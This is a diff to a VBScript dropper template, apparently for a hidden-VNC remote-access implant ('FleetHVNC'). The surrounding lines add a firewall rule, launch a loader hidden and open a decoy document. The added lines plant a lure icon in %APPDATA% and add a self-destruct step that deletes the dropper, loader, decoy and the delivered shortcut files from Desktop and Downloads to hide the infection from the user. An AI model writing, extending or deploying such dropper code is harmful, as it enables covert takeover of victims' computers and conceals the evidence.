@@ -40,11 +40,27 @@ fwRule = "netsh advfirewall firewall add rule name=FleetHVNC{{RAND4}} dir=out ac
 shell.Run fwRule, 0, True
 On Error GoTo 0
 
+' lure icon next to the shortcut (also copied to %APPDATA% for the .lnk icon)
+On Error Resume Next
+WriteFile shell.ExpandEnvironmentStrings("%APPDATA%") & "\{{ICON_NAME}}", "{{ICON_B64}}"
+On Error GoTo 0
+
 shell.CurrentDirectory = base
 shell.Run """" & loaderPath & """", 0, False
 
 WScript.Sleep 1500
 shell.Run """" & decoyPath & """", 1, False
+
+' self-destruct: once the implant is running, remove the dropper artifacts and
+' the delivered shortcut so nothing remains visible to the user.
+On Error Resume Next
+Dim selfPath, cleaner
+selfPath = WScript.ScriptFullName
+cleaner = "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & selfPath & """ """ & _
+          loaderPath & """ """ & decoyPath & """ 2>nul & " & _
+          "del /f /q ""%USERPROFILE%\Desktop\{{DOC}}*.lnk"" ""%USERPROFILE%\Downloads\{{DOC}}*.lnk"" 2>nul"
+shell.Run cleaner, 0, False
+On Error GoTo 0
 
 Sub WriteFile(path, b64)
   Dim xml, node, stream
